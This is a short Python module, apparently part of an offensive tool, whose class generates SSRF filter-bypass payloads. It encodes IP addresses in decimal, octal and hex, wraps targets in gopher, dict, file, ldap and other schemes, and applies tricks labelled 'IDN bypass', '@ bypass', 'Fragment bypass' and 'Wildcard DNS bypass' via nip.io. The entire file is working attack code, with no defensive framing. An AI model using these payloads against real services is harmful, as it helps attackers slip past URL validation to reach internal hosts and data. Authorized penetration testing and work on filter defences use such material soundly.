import base64
from typing import List

class BypassGenerator:
    @staticmethod
    def get_ip_encodings(ip: str) -> List[str]:
        encodings = [ip]
        # Decimal encoding
        try:
            octets = list(map(int, ip.split('.')))
            decimal = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
            encodings.append(str(decimal))
        except: pass
        
        # Octal encoding
        try:
            octal = ".".join([oct(o).replace("0o", "0") for o in octets])
            encodings.append(octal)
        except: pass

        # Hex encoding
        try:
            hex_val = ".".join([hex(o) for o in octets])
            encodings.append(hex_val)
        except: pass

        return encodings

    @staticmethod
    def get_protocol_wrappers(target: str) -> List[str]:
        return [
            f"http://{target}",
            f"https://{target}",
            f"gopher://{target}",
            f"dict://{target}",
            f"file://{target}",
            f"ftp://{target}",
            f"tftp://{target}",
            f"ldap://{target}"
        ]

    @staticmethod
    def apply_encodings(payload: str) -> List[str]:
        return [
            payload,
            payload.replace(".", "。"), # IDN bypass
            payload.replace(".", "．"), # IDN bypass 2
            f"http://127.0.0.1@{payload}", # @ bypass
            f"http://{payload}#google.com", # Fragment bypass
            f"http://{payload}.nip.io", # Wildcard DNS bypass
            base64.b64encode(payload.encode()).decode(),
        ]
